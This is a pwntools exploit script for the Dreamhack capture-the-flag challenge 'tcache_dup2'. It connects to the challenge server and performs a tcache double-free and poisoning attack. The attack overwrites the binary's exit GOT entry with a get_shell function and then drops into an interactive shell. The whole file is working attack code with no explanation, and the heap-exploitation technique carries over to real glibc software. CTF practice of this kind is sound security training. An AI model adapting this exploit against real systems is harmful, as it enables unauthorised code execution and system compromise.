from pwn import *
import sys

p = remote('host3.dreamhack.games', 8567)
e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())


create(0x10, b'AAAAAAAA')
create(0x10, b'BBBBBBBB')
create(0x10, b'CCCCCCCC')
delete(2)
delete(1)
delete(0)

modify(0, 16, b'AAAAAAAAAAAAAAAA')

delete(0)

create(0x10, p64(e.got['exit']))
create(0x10, b'BBBBBBBB')
create(0x10, p64(e.symbols['get_shell']))

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'7')

p.interactive()